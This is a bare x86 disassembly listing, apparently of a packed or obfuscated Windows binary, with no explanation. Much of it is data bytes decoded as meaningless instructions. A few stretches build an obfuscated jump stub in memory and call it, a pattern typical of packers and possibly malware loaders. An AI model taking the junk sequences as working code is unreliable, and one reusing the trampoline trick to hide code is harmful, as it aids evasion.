  410101:	div    BYTE PTR [eax-0x14691a70]
  410107:	mov    edi,0x9a81cedb
  41010c:	outs   dx,BYTE PTR ds:[esi]
  41010d:	int    0x8
  41010f:	push   esp
  410110:	in     eax,0xad
  410112:	les    esi,FWORD PTR [edi-0x7601ea17]
  410118:	daa    
  410119:	push   ebx
  41011a:	loop   0x41019a
  41011c:	fldcw  WORD PTR [edi+0x4f]
  41011f:	pop    edx
  410120:	rcl    esi,cl
  410122:	push   0x36
  410124:	cld    
  410125:	lea    esp,[eax+0x7a61e6ac]
  41012b:	mov    bl,0x2f
  41012d:	pop    esp
  41012e:	xlat   BYTE PTR ds:[ebx]
  41012f:	push   0xfffffffa
  410131:	push   edx
  410132:	mov    edx,DWORD PTR [edi-0x6e]
  410135:	add    ebx,esi
  410137:	cli    
  410138:	inc    esp
  410139:	cs aaa 
  41013b:	pop    edi
  41013c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41013d:	inc    ecx
  41013e:	sar    DWORD PTR [eax],0x4f
  410141:	push   ds
  410142:	test   eax,edi
  410144:	lahf   
  410145:	xor    al,0xc7
  410147:	adc    al,0x53
  410149:	sub    edi,eax
  41014b:	xchg   edi,eax
  41014c:	(bad)  
  41014d:	jmp    0x41013a
  41014f:	adc    BYTE PTR [edi],0x98
  410152:	lahf   
  410153:	rol    eax,0xca
  410156:	xchg   esp,eax
  410157:	addr16 push bp
  41015a:	dec    esp
  41015b:	loop   0x410136
  41015d:	mov    eax,0x80d7dbec
  410162:	sahf   
  410163:	iret   
  410164:	(bad)  
  410165:	int    0x0
  410167:	pop    eax
  410168:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410169:	push   cs
  41016a:	or     DWORD PTR [ebx-0x6c],ebx
  41016d:	fs lahf 
  41016f:	sbb    eax,0xb2c39acb
  410174:	xchg   esp,eax
  410175:	enter  0xef27,0xd7
  410179:	inc    esp
  41017a:	or     esp,ebp
  41017c:	(bad)  
  41017d:	xchg   edi,eax
  41017e:	test   ch,0xcf
  410181:	add    al,0x9a
  410183:	cmc    
  410184:	imul   edx,DWORD PTR [edx-0xed928fa],0xfffffff5
  41018b:	in     eax,0x2b
  41018d:	and    DWORD PTR [ecx+0x6278ec1f],esp
  410193:	(bad)  
  410194:	imul   esi,DWORD PTR [edi-0x5a],0xffffffde
  410198:	mov    BYTE PTR [ebx+0x81afc37],dl
  41019e:	aas    
  41019f:	fs push ebp
  4101a1:	sub    DWORD PTR [ecx+0x24],edi
  4101a4:	adc    BYTE PTR [edi-0x7b85147b],0x9f
  4101ab:	lods   eax,DWORD PTR ds:[esi]
  4101ac:	xor    eax,0x8ba74c85
  4101b1:	stos   DWORD PTR es:[edi],eax
  4101b2:	sub    DWORD PTR [esi+0x25],esi
  4101b5:	(bad)  
  4101b6:	xchg   edx,eax
  4101b7:	mov    cl,0x0
  4101b9:	mov    esi,0x76b97d46
  4101be:	stos   BYTE PTR es:[edi],al
  4101bf:	shr    BYTE PTR [edi-0x6f435468],1
  4101c5:	and    bl,BYTE PTR [eax]
  4101c7:	xchg   esi,eax
  4101c8:	ins    DWORD PTR es:[edi],dx
  4101c9:	lea    ebx,[ebx-0x3a294747]
  4101cf:	cs mov bl,bl
  4101d2:	repnz scas eax,DWORD PTR es:[edi]
  4101d4:	cmp    DWORD PTR [eax],0x3b
  4101d7:	call   0x7b9a:0x437bfee1
  4101de:	dec    esp
  4101df:	in     al,dx
  4101e0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4101e1:	push   0x32
  4101e3:	add    al,0x66
  4101e5:	jne    0x41016b
  4101e7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4101e8:	mov    edx,0x6bb818a9
  4101ed:	(bad)  
  4101ee:	popf   
  4101ef:	sub    cl,BYTE PTR [ebp+0x39]
  4101f2:	mov    al,0x7a
  4101f4:	retf   0x175c
  4101f7:	repnz int3 
  4101f9:	xchg   BYTE PTR [esi+ebx*8],al
  4101fc:	cld    
  4101fd:	dec    eax
  4101fe:	mov    ?,WORD PTR [bp+si]
  410201:	sbb    DWORD PTR [edx-0x2a4d6305],esi
  410207:	jmp    0x5c20d27c
  41020c:	mov    bl,0xfc
  41020e:	mov    WORD PTR ds:0xfa1631de,cs
  410214:	or     BYTE PTR [ebp-0x77],0xb8
  410218:	xor    ecx,DWORD PTR [edx-0x3824d31f]
  41021e:	repnz fyl2x 
  410221:	enter  0xe2e2,0xf
  410225:	test   DWORD PTR ds:0x8b000004,esi
  41022b:	dec    ebp
  41022c:	mov    BYTE PTR [ebx],dh
  41022e:	sar    BYTE PTR [eax+0x209c],cl
  410234:	div    ecx
  410236:	mov    ecx,DWORD PTR ds:0x422538
  41023c:	mov    ecx,DWORD PTR [ecx+0x1a8]
  410242:	xor    edx,edx
  410244:	sub    ecx,eax
  410246:	mov    eax,DWORD PTR [ebp-0x4c]
  410249:	xor    eax,0x3daa
  41024e:	sub    eax,0x3375
  410253:	or     eax,0x6931
  410258:	lea    eax,[ebp+eax*1-0x6c25]
  41025f:	push   eax
  410260:	mov    eax,DWORD PTR [ebp-0x8c]
  410266:	push   0x18
  410268:	pop    esi
  410269:	div    esi
  41026b:	mov    esi,DWORD PTR [ebp-0x60]
  41026e:	xor    edx,edx
  410270:	div    esi
  410272:	mov    edx,DWORD PTR [ebp-0x44]
  410275:	mov    esi,DWORD PTR [ebp-0x34]
  410278:	xor    eax,edx
  41027a:	xor    edx,edx
  41027c:	div    esi
  41027e:	imul   eax,eax,0x7d2a
  410284:	sub    eax,0x928ded7
  410289:	push   eax
  41028a:	mov    eax,ds:0x422538
  41028f:	add    eax,0xaa
  410294:	push   eax
  410295:	mov    eax,DWORD PTR [ebp-0x3c]
  410298:	sub    ecx,eax
  41029a:	mov    eax,DWORD PTR [ebp-0x24]
  41029d:	push   DWORD PTR [ecx+eax*1+0xbd4]
  4102a4:	call   0x41e9f9
  4102a9:	mov    DWORD PTR [ebp-0x4],eax
  4102ac:	mov    ecx,DWORD PTR ds:0x422640
  4102b2:	lea    eax,[ebp+0x4]
  4102b5:	mov    DWORD PTR [ecx*4+0x422638],eax
  4102bc:	inc    DWORD PTR ds:0x422640
  4102c2:	mov    eax,DWORD PTR [ebp-0x4]
  4102c5:	mov    eax,DWORD PTR [ebp-0x4]
  4102c8:	xor    edx,edx
  4102ca:	shld   edx,eax,0x2
  4102ce:	shl    eax,0x2
  4102d1:	mov    ecx,0xca79a575
  4102d6:	mov    esi,0x9c1b89e8
  4102db:	xor    eax,ecx
  4102dd:	xor    edx,esi
  4102df:	cmp    eax,ecx
  4102e1:	jne    0x4105c9
  4102e7:	cmp    edx,esi
  4102e9:	jne    0x4105c9
  4102ef:	mov    eax,0xca79a571
  4102f4:	mov    edx,esi
  4102f6:	jmp    0x410669
  4102fb:	jmp    0x4105c9
  410300:	sbb    al,0xfc
  410302:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410303:	fs sbb bl,BYTE PTR es:[edx]
  410307:	mov    ebp,0x70cf8d86
  41030c:	jg     0x410339
  41030e:	mov    ecx,0x1892c37c
  410313:	sbb    BYTE PTR [esi-0x19e7e7ec],bh
  410319:	xchg   ebx,eax
  41031a:	mov    ah,al
  41031c:	push   ebp
  41031d:	xchg   BYTE PTR [edx-0x49],ah
  410320:	cmp    DWORD PTR [eax+ecx*2],esp
  410323:	(bad)  
  410325:	inc    ecx
  410326:	push   es
  410327:	dec    ebp
  410328:	inc    ebx
  410329:	sub    al,0xa6
  41032b:	dec    esi
  41032c:	outs   dx,BYTE PTR ds:[esi]
  41032d:	imul   DWORD PTR [esi+eiz*2-0x2a]
  410331:	jnp    0x4103aa
  410333:	or     cl,BYTE PTR [eax+0xea3045d]
  410339:	test   DWORD PTR [ecx],eax
  41033b:	sbb    eax,0x98ebe31b
  410340:	leave  
  410341:	out    0xa,al
  410343:	inc    edx
  410344:	mov    ecx,0x89efae89
  410349:	inc    ebx
  41034a:	xor    DWORD PTR [edx-0x32],0x49104266
  410351:	mov    ebp,DWORD PTR [ecx+0x2774ed0e]
  410357:	(bad)  
  410358:	and    al,0xca
  41035a:	push   edi
  41035b:	inc    esi
  41035c:	or     DWORD PTR [eax-0x62a27526],edi
  410362:	test   al,0x4b
  410364:	rcr    BYTE PTR [esi+esi*1-0x48],cl
  410368:	(bad)  
  410369:	popa   
  41036a:	add    al,0x4a
  41036c:	jmp    0x4103c0
  41036e:	mov    eax,ds:0xcebe89a6
  410373:	mov    al,0x4f
  410375:	dec    eax
  410376:	cmp    edx,0x728bbb10
  41037c:	mov    esi,0x89495d60
  410381:	jmp    0x5682db5b
  410386:	aaa    
  410387:	ins    BYTE PTR es:[edi],dx
  410388:	in     al,0xe8
  41038a:	cmp    al,0x30
  41038c:	add    eax,0xf0a0d639
  410391:	sbb    ch,ah
  410393:	xor    ecx,DWORD PTR [edx+0x1ed38f0a]
  410399:	inc    DWORD PTR [edi-0x65]
  41039c:	xor    edx,DWORD PTR [ebx-0x7ce9877d]
  4103a2:	sbb    BYTE PTR [edi-0x34],0xd0
  4103a6:	pusha  
  4103a7:	into   
  4103a8:	push   esp
  4103a9:	ret    
  4103aa:	xor    bh,BYTE PTR [edi-0x4a59eaee]
  4103b0:	inc    ecx
  4103b1:	cld    
  4103b2:	out    dx,al
  4103b3:	stos   DWORD PTR es:[edi],eax
  4103b4:	cwde   
  4103b5:	lods   eax,DWORD PTR ds:[esi]
  4103b6:	sub    DWORD PTR [eax+ebp*8-0x3c],esp
  4103ba:	repnz ins DWORD PTR es:[edi],dx
  4103bc:	push   ebx
  4103bd:	popa   
  4103be:	pop    ds
  4103bf:	into   
  4103c0:	sti    
  4103c1:	ja     0x4103b3
  4103c3:	mov    cl,0x4d
  4103c5:	nop
  4103c6:	fcom   QWORD PTR [ebx]
  4103c8:	loope  0x410449
  4103ca:	sub    cl,cl
  4103cc:	nop
  4103cd:	add    cl,BYTE PTR [ebx+ecx*8-0x708362c7]
  4103d4:	jmp    0x6600:0x53914494
  4103db:	adc    edi,DWORD PTR [edx+0x129e2360]
  4103e1:	rol    ebp,1
  4103e3:	xchg   DWORD PTR [ebx],ebx
  4103e5:	popf   
  4103e6:	add    BYTE PTR [ebx-0x5],dh
  4103e9:	or     BYTE PTR [eax+ecx*2],bl
  4103ec:	and    ebx,DWORD PTR [ebx]
  4103ee:	hlt    
  4103ef:	(bad)  
  4103f0:	in     al,dx
  4103f1:	push   ecx
  4103f2:	mov    BYTE PTR [edx+0x75861329],al
  4103f8:	xor    BYTE PTR [ebx-0x1949efb6],0x2e
  4103ff:	mov    esi,0xda136374
  410404:	pop    esi
  410405:	std    
  410406:	idiv   BYTE PTR ds:0x5c50786
  41040c:	mov    dl,0x7c
  41040e:	repz iret 
  410410:	and    ecx,DWORD PTR [edx+0x56]
  410413:	les    edx,FWORD PTR ds:0x5d82c011
  410419:	pop    esi
  41041a:	mov    BYTE PTR [ebx],ah
  41041c:	xlat   BYTE PTR ds:[ebx]
  41041d:	jno    0x410456
  41041f:	arpl   WORD PTR [ebx-0x6ccdc900],di
  410425:	gs mov al,0x64
  410428:	push   0xc75e2f6a
  41042d:	shl    cl,0xd1
  410430:	fsubr  QWORD PTR [ecx-0x33]
  410433:	pop    esp
  410434:	call   0x3676:0x76ef9eb4
  41043b:	popa   
  41043c:	jp     0x4103ed
  41043e:	mov    ah,0xe8
  410440:	arpl   WORD PTR [esi+0x5f2a0eab],dx
  410446:	or     edi,DWORD PTR [eax-0x13]
  410449:	ds in  al,dx
  41044b:	xchg   edi,eax
  41044c:	inc    esp
  41044d:	pop    ss
  41044e:	nop
  41044f:	xor    al,0x5d
  410451:	loop   0x410479
  410453:	pusha  
  410454:	jl     0x410474
  410456:	push   esp
  410457:	cmp    DWORD PTR [edi],edi
  410459:	pop    edx
  41045a:	rcl    BYTE PTR [ecx-0x1d],1
  41045d:	dec    ebx
  41045e:	jmp    0x4104c8
  410460:	cmp    al,0xfd
  410462:	xor    edi,DWORD PTR [edx+ecx*8]
  410465:	adc    al,0x7a
  410467:	push   ss
  410468:	jmp    0x3bb1f284
  41046d:	test   al,0xf1
  41046f:	jmp    0x505a:0xa369ec76
  410476:	ficom  DWORD PTR [eax]
  410478:	loope  0x410414
  41047a:	int    0x95
  41047c:	test   eax,0x7bafc81
  410481:	es retf 0x6eda
  410485:	xchg   ah,cl
  410487:	stc    
  410488:	popa   
  410489:	in     al,dx
  41048a:	jnp    0x41049c
  41048c:	je     0x410414
  41048e:	mov    al,ds:0xd37142f4
  410493:	or     DWORD PTR [edx],ebx
  410495:	sbb    cl,al
  410497:	and    ah,dh
  410499:	stc    
  41049a:	adc    edx,DWORD PTR [edi-0x2c]
  41049d:	adc    BYTE PTR fs:[ebp+0x41998964],0xe4
  4104a5:	(bad)  
  4104a6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4104a7:	inc    ebp
  4104a8:	dec    BYTE PTR [esi-0x6227cbf6]
  4104ae:	imul   edi,esp,0xd40aecdf
  4104b4:	test   al,0x65
  4104b6:	lock push edx
  4104b8:	rcl    cl,cl
  4104ba:	jle    0x410503
  4104bc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4104bd:	imul   ebp,DWORD PTR [edi],0xffffff8b
  4104c0:	mov    eax,0xe145e97e
  4104c5:	sbb    DWORD PTR [ecx+esi*2+0x16],eax
  4104c9:	daa    
  4104ca:	pop    ebx
  4104cb:	mov    edx,0x73b2db6f
  4104d0:	jne    0x41054b
  4104d2:	and    esp,ecx
  4104d4:	xor    dl,bl
  4104d6:	and    BYTE PTR [esi],ch
  4104d8:	cmp    DWORD PTR [edi-0x63],ebx
  4104db:	(bad)  
  4104dd:	ret    0x56fa
  4104e0:	dec    esi
  4104e1:	in     al,dx
  4104e2:	push   0x3f
  4104e4:	adc    BYTE PTR [eax+eax*8],dl
  4104e7:	xlat   BYTE PTR ds:[ebx]
  4104e8:	cmp    eax,0xfe3a5548
  4104ed:	inc    ebx
  4104ee:	pop    ebx
  4104ef:	mov    esp,0x3a15ebfd
  4104f4:	push   eax
  4104f5:	sti    
  4104f6:	sub    eax,0xb2b9e4e8
  4104fb:	lods   al,BYTE PTR ds:[esi]
  4104fc:	sti    
  4104fd:	xchg   esi,eax
  4104fe:	xchg   esp,eax
  4104ff:	out    0x54,al
  410501:	loope  0x4104d3
  410503:	inc    eax
  410504:	loopne 0x4104de
  410506:	gs add edx,esp
  410509:	mov    ch,0xb3
  41050b:	aas    
  41050c:	enter  0xe888,0xbd
  410510:	gs mov ch,0xaf
  410513:	sbb    BYTE PTR [ebp-0x7b],bh
  410516:	lock sub BYTE PTR [edx],bh
  410519:	xchg   ecx,eax
  41051a:	xchg   esi,eax
  41051b:	cmp    eax,0x4adef857
  410520:	call   0x6b47b7a
  410525:	mov    dh,0x41
  410527:	push   ss
  410528:	inc    esp
  410529:	jmp    0x4104d4
  41052b:	pop    ss
  41052c:	mul    eax
  41052e:	imul   edx,DWORD PTR [ebp-0x5774573],0x96f22e1d
  410538:	mov    bh,0x1d
  41053a:	and    esi,eax
  41053c:	xor    BYTE PTR [ebx-0x36],al
  41053f:	sbb    eax,0xb3e05a2b
  410544:	ret    0x6be0
  410547:	jg     0x41051c
  410549:	adc    ebx,ebp
  41054b:	imul   edx,esp,0xe3b1799d
  410551:	cmp    BYTE PTR [ebx+ecx*2+0x3429803b],ch
  410558:	jb     0x410546
  41055a:	push   edi
  41055b:	push   edi
  41055c:	jmp    0x3101a984
  410561:	push   es
  410562:	dec    edi
  410563:	ret    0xc3dc
  410566:	mov    bl,0x39
  410568:	addr16 dec esp
  41056a:	adc    cl,BYTE PTR [esi]
  41056c:	adc    al,0x64
  41056e:	sbb    al,0xc6
  410570:	sub    eax,0x226d5bb8
  410575:	cmp    BYTE PTR [ebx*4+0x4b22c3df],0xa8
  41057d:	rcl    BYTE PTR [esi-0x15],1
  410580:	jo     0x41059a
  410582:	pop    eax
  410583:	data16 sbb ah,BYTE PTR [edi-0x400409a9]
  41058a:	xor    eax,0x207b5973
  41058f:	mul    DWORD PTR [ecx+0x24]
  410592:	push   0x5b5be4c4
  410597:	add    DWORD PTR [esi+eax*8+0x8cbb308],0xffffff8e
  41059f:	xor    ecx,esi
  4105a1:	sub    eax,0x4560ea9
  4105a6:	jecxz  0x4105ce
  4105a8:	shl    BYTE PTR [edx-0x59],1
  4105ab:	or     BYTE PTR [ebx+edi*8+0x5753dcc4],0xd7
  4105b3:	dec    ebx
  4105b4:	icebp  
  4105b5:	jle    0x41061e
  4105b7:	jge    0x4105ee
  4105b9:	ins    BYTE PTR es:[edi],dx
  4105ba:	push   ds
  4105bb:	outs   dx,DWORD PTR ds:[esi]
  4105bc:	ss inc eax
  4105be:	lds    edi,FWORD PTR [esi-0x3d]
  4105c1:	and    eax,0x160152be
  4105c6:	inc    edx
  4105c7:	mov    al,0x58
  4105c9:	lea    eax,[ebp-0x10]
  4105cc:	mov    DWORD PTR [ebp-0x9c],eax
  4105d2:	mov    eax,DWORD PTR [ebp-0x54]
  4105d5:	mov    DWORD PTR [ebp-0x10],eax
  4105d8:	mov    eax,DWORD PTR [ebp-0x10]
  4105db:	mov    ecx,DWORD PTR [ebp-0x4]
  4105de:	sub    eax,ecx
  4105e0:	mov    DWORD PTR [ebp-0x10],eax
  4105e3:	mov    eax,DWORD PTR [ebp-0x20]
  4105e6:	mov    ecx,DWORD PTR [ebp-0x1c]
  4105e9:	sub    DWORD PTR [ebp-0x10],eax
  4105ec:	mov    eax,DWORD PTR [ebp-0x4]
  4105ef:	mov    DWORD PTR [eax],0x658776e9
  4105f5:	mov    DWORD PTR [eax+0x4],0xab756547
  4105fc:	mov    eax,DWORD PTR [ebp-0x10]
  4105ff:	mov    ecx,DWORD PTR [ebp-0x4]
  410602:	mov    DWORD PTR [ecx+0x1],eax
  410605:	mov    eax,ds:0x4223b4
  41060a:	push   DWORD PTR [eax]
  41060c:	push   DWORD PTR ds:0x422628
  410612:	push   DWORD PTR ds:0x4223bc
  410618:	push   DWORD PTR ds:0x422608
  41061e:	push   DWORD PTR ds:0x42267c
  410624:	push   0xa4069aaa
  410629:	push   0xa4069aae
  41062e:	push   DWORD PTR [ebp-0x5c]
  410631:	mov    eax,DWORD PTR [ebp-0x4]
  410634:	call   eax
  410636:	mov    eax,DWORD PTR [edi]
  410638:	mov    eax,DWORD PTR [ebp+0x8]
  41063b:	push   DWORD PTR [eax]
  41063d:	call   0x4110ff
  410642:	mov    eax,ds:0x422538
  410647:	push   0x4
  410649:	add    eax,0x1dc
  41064e:	push   eax
  41064f:	push   edi
  410650:	call   0x415231
  410655:	mov    eax,0xca79a57d
  41065a:	jmp    0x4102f4
  41065f:	mov    eax,0xca79a575
  410664:	mov    edx,0x9c1b89e8
  410669:	pop    esi
  41066a:	pop    ebx
  41066b:	leave  
  41066c:	ret    0x4
  41066f:	push   ebp
  410670:	mov    ebp,esp
  410672:	sub    esp,0x20
  410675:	push   ebx
  410676:	push   edi
  410677:	mov    DWORD PTR [ebp-0x8],0x522e
  41067e:	mov    DWORD PTR [ebp-0x4],0x3dbd
  410685:	mov    DWORD PTR [ebp-0x10],0x53f1
  41068c:	mov    DWORD PTR [ebp-0xc],0x631b
  410693:	mov    DWORD PTR [ebp-0x18],0x524d
  41069a:	mov    DWORD PTR [ebp-0x14],0x1600
  4106a1:	mov    eax,DWORD PTR [ebp-0x18]
  4106a4:	mov    ecx,DWORD PTR [ebp-0x14]
  4106a7:	mov    edx,DWORD PTR [ebp-0x10]
  4106aa:	mov    edi,DWORD PTR [ebp-0xc]
  4106ad:	push   edi
  4106ae:	push   edx
  4106af:	push   ecx
  4106b0:	push   eax
  4106b1:	call   0x416c20
  4106b6:	mov    ecx,DWORD PTR [ebp-0x8]
  4106b9:	mov    edi,DWORD PTR [ebp-0x4]
  4106bc:	add    eax,0x1dc8
  4106c1:	adc    edx,0x6fbf
  4106c7:	and    edx,edi
  4106c9:	push   0x1061
  4106ce:	and    eax,ecx
  4106d0:	or     edx,0x23ff
  4106d6:	push   0x4000022f
  4106db:	jmp    0x4109bb
  4106e0:	pop    edi
  4106e1:	jp     0x410689
  4106e3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4106e4:	mov    ds:0x103a5b1c,al
  4106e9:	fsub   QWORD PTR [edi-0x44]
  4106ec:	add    BYTE PTR [ebp+0xe],dh
  4106ef:	jle    0x410759
  4106f1:	mov    ds,WORD PTR [eax]
  4106f3:	sbb    BYTE PTR [edx-0x21e7e7ec],bl
  4106f9:	ins    BYTE PTR es:[edi],dx
  4106fa:	repnz stc 
  4106fc:	push   esp
  4106fd:	push   ebx
  4106fe:	(bad)  
  4106ff:	loopne 0x4106de
  410701:	mov    ebx,0xdf6d523d
  410706:	push   ebx
  410707:	mov    bl,0xe6
  410709:	mov    ah,0xe0
  41070b:	mov    al,ds:0xd38a0e04
  410710:	mov    ds:0x857dd9cb,eax
  410715:	shl    BYTE PTR gs:[eax-0x2c],1
  410719:	jmp    0x1dab:0x91a49b1
  410720:	adc    DWORD PTR [edx-0x29],edx
  410723:	pop    es
  410724:	addr16 pop esi
  410726:	sub    ecx,ecx
  410728:	xor    edx,DWORD PTR [esi]
  41072a:	xchg   edi,eax
  41072b:	mov    cl,0x4a
  41072d:	(bad)  [eax-0x28]
  410730:	inc    ebx
  410731:	fs and edx,edx
  410734:	lds    edi,FWORD PTR [edi+0x4]
  410737:	add    eax,DWORD PTR [esi]
  410739:	dec    esi
  41073a:	pushf  
  41073b:	pop    ss
  41073c:	cld    
  41073d:	arpl   ax,bx
  41073f:	mov    cl,0x8
  410741:	jno    0x410710
  410743:	lods   eax,DWORD PTR ds:[esi]
  410744:	mov    edi,0xb67a6049
  410749:	lgs    ecx,FWORD PTR [eax-0x6b]
  41074d:	adc    BYTE PTR [edx+edi*4],dh
  410750:	cdq    
  410751:	fsub   DWORD PTR ds:0x31c4ea1f
  410757:	jle    0x4106f6
  410759:	ja     0x4107a0
  41075b:	ins    DWORD PTR es:[edi],dx
  41075c:	xor    ebp,ebx
  41075e:	xlat   BYTE PTR ds:[ebx]
  41075f:	push   edi
  410760:	outs   dx,DWORD PTR ds:[esi]
  410761:	pop    ebx
  410762:	jmp    0x75664655
  410767:	or     eax,0xf781a047
  41076c:	mov    ebx,0xff72d04d
  410771:	jge    0x410719
  410773:	or     DWORD PTR [edi],edx
  410775:	inc    edx
  410776:	addr16 ret 0x7e4b
  41077a:	adc    al,0x67
  41077c:	jns    0x4107b6
  41077e:	sbb    ebp,DWORD PTR [edx-0x19]
  410781:	outs   dx,BYTE PTR ds:[esi]
  410782:	call   0x1204:0x577dd7e7
  410789:	add    BYTE PTR [esi-0x2cecba93],dh
  41078f:	cli    
  410790:	jp     0x4107ae
  410792:	gs jg  0x41073b
  410795:	jmp    0x4088:0xd23a4b5f
  41079c:	xor    BYTE PTR fs:[esi],cl
  41079f:	sbb    ebx,DWORD PTR [edi]
  4107a1:	retf   
  4107a2:	dec    eax
  4107a3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4107a4:	mov    al,0xfb
  4107a6:	jo     0x410765
  4107a8:	inc    esp
  4107a9:	mov    ds:0x85a51daa,al
  4107ae:	xchg   ebx,eax
  4107af:	inc    eax
  4107b0:	retf   0xa93b
  4107b3:	pop    esi
  4107b4:	addr16 or ax,0x5443
  4107b9:	les    edi,FWORD PTR [eax]
  4107bb:	into   
  4107bc:	call   FWORD PTR [edx+0x4f]
  4107bf:	push   ecx
  4107c0:	pushf  
  4107c1:	dec    edx
  4107c2:	mov    dl,BYTE PTR [edx]
  4107c4:	rol    DWORD PTR [ebx+0x2a],1
  4107c7:	push   0xffffff91
  4107c9:	push   ebx
  4107ca:	daa    
  4107cb:	lock loope 0x4107bb
  4107ce:	mov    edi,0x361e939a
  4107d3:	test   BYTE PTR [esp+ebx*2+0x19],dh
  4107d7:	and    al,0x65
  4107d9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4107da:	cmc    
  4107db:	sbb    al,al
  4107dd:	test   BYTE PTR [ecx+0x75],cl
  4107e0:	xchg   esi,eax
  4107e1:	jle    0x410765
  4107e3:	mov    esp,0x76fdb18c
  4107e8:	pop    ebp
  4107e9:	adc    al,0x91
  4107eb:	dec    ecx
  4107ec:	in     eax,0xb9
  4107ee:	lods   al,BYTE PTR ds:[esi]
  4107ef:	int3   
  4107f0:	lahf   
  4107f1:	fisttp DWORD PTR [ebx-0x6f]
  4107f4:	pop    ds
  4107f5:	cmp    eax,0x7ea0abf8
  4107fa:	es pusha 
  4107fc:	sar    BYTE PTR [edi],1
  4107fe:	inc    ebx
  4107ff:	xlat   BYTE PTR ds:[ebx]
  410800:	sub    eax,0xa1a0770f
  410805:	nop
  410806:	jmp    0x4554:0x77814e67
  41080d:	out    dx,eax
  41080e:	cmp    DWORD PTR [eax-0x6d],esp
  410811:	ret    
  410812:	push   eax
  410813:	mov    ds:0xd482db81,eax
  410818:	pop    edx
  410819:	pop    ecx
  41081a:	sub    ecx,ebx
  41081c:	dec    eax
  41081d:	mov    edx,0x7fc60202
  410822:	mov    eax,0x98d09e5d
  410827:	je     0x4107f9
  410829:	ds jp  0x4107f5
  41082c:	sub    al,0xad
  41082e:	call   0x63f0c9ee
  410833:	sub    DWORD PTR [ebp+0x39],ebp
  410836:	cmc    
  410837:	mov    edi,0x2099e1f1
  41083c:	jnp    0x4108a6
  41083e:	xlat   BYTE PTR ds:[ebx]
  41083f:	add    al,0x15
  410841:	sub    edi,edi
  410843:	sub    al,0x18
  410845:	jbe    0x4108ba
  410847:	cmp    al,0xf4
  410849:	adc    al,0xb
  41084b:	and    eax,0xb3ec4c59
  410850:	add    esp,edi
  410852:	out    dx,eax
  410853:	adc    ecx,DWORD PTR [edx+ecx*4]
  410856:	jmp    0x41084e
  410858:	aaa    
  410859:	in     eax,0xbd
  41085b:	(bad)  
  41085c:	repz xchg esp,eax
  41085e:	pop    esp
  41085f:	test   eax,0xea1f26ea
  410864:	hlt    
  410865:	add    eax,0x9471ac9
  41086a:	retf   
  41086b:	fsub   DWORD PTR [esp]
  41086e:	cmp    edi,esi
  410870:	into   
  410871:	adc    al,0xb3
  410873:	sub    edi,esi
  410875:	or     DWORD PTR [ebp+0x7e163a2e],ebp
  41087b:	push   esi
  41087c:	sbb    al,0x0
  41087e:	and    al,0x7
  410880:	cmp    BYTE PTR [ecx],dh
  410882:	xchg   ebx,eax
  410883:	(bad)  [ecx-0x1]
  410886:	jno    0x410853
  410888:	jnp    0x41080d
  41088a:	int3   
  41088b:	adc    al,0x46
  41088d:	adc    BYTE PTR [esi],0x87
  410890:	sbb    eax,0x13bfc54d
  410895:	mov    eax,0x725f4f22
  41089a:	jg     0x4108d3
  41089c:	sub    ah,BYTE PTR [edi-0x2ae54de7]
  4108a2:	call   FWORD PTR [ebp+0x35]
  4108a5:	adc    DWORD PTR [edx-0x75],esi
  4108a8:	dec    eax
  4108a9:	ins    BYTE PTR es:[edi],dx
  4108aa:	adc    al,0x63
  4108ac:	jnp    0x4108cd
  4108ae:	push   cs
  4108af:	xor    DWORD PTR [edi+0x3b],ecx
  4108b2:	jo     0x410836
  4108b4:	mov    ebp,0x5bb1c7bb
  4108b9:	test   eax,0x520bac3a
  4108be:	push   ds
  4108bf:	mov    ebp,0xeb8f5f18
  4108c4:	dec    ebx
  4108c5:	jmp    0x822a:0xd6407c7e
  4108cc:	dec    dh
  4108ce:	pop    edx
  4108cf:	ds test eax,0xfa54d8d4
  4108d5:	mov    al,BYTE PTR [edi]
  4108d7:	mov    esi,0x5c1a957c
  4108dc:	fstp   st(0)
  4108de:	inc    esi
  4108df:	xor    dh,ch
  4108e1:	and    ah,bh
  4108e3:	xor    DWORD PTR [esi],esi
  4108e5:	sbb    dl,BYTE PTR [ecx+edx*2]
  4108e8:	adc    DWORD PTR [eax-0x1d],ecx
  4108eb:	mov    dh,0x73
  4108ed:	pusha  
  4108ee:	and    bh,BYTE PTR [esi-0x340d3c77]
  4108f4:	lods   al,BYTE PTR ds:[esi]
  4108f5:	mov    DWORD PTR [eax+0x5805d141],edx
  4108fb:	ss gs add ah,dh
  4108ff:	mov    bh,0x65
  410901:	jae    0x4108b6
  410903:	clc    
  410904:	and    bh,ah
  410906:	mov    al,al
  410908:	xor    ebx,DWORD PTR [esi+edx*8]
  41090b:	adc    ecx,DWORD PTR [edx-0x7701d43d]
  410911:	cmp    ebx,DWORD PTR [edi+0x3fc31e67]
  410917:	or     ebp,DWORD PTR [ebp-0x32de2be8]
  41091d:	sahf   
  41091e:	mov    al,0x2a
  410920:	sub    eax,0xc3db7622
  410925:	jmp    0x5fb3:0x291368c2
  41092c:	push   eax
  41092d:	cmp    al,0xa6
  41092f:	pusha  
  410930:	inc    ebp
  410931:	pop    DWORD PTR [ebx-0x68]
  410934:	stos   BYTE PTR es:[edi],al
  410935:	mov    edx,0xc7627f45
  41093a:	fbld   TBYTE PTR [edx-0x1e03eb84]
  410940:	imul   ebp,DWORD PTR [edi+edi*8+0x5],0x53
  410945:	ret    0x64aa
  410948:	sar    BYTE PTR [edx+0x1343beb9],cl
  41094e:	das    
  41094f:	cmp    bh,bl
  410951:	(bad)  
  410952:	hlt    
  410953:	lds    edx,FWORD PTR [ebx+0x7b]
  410956:	(bad)  
  410957:	sub    al,0x3e
  410959:	mov    ds:0x51c706e9,al
  41095e:	lea    ebp,[ebp+0x3e]
  410961:	imul   esp,DWORD PTR [eax-0x685cc560],0x975ecf16
  41096b:	cmp    BYTE PTR [edi],dh
  41096d:	jne    0x410904
  41096f:	mov    eax,ds:0xe07fa545
  410974:	jb     0x4108ff
  410976:	test   al,0xea
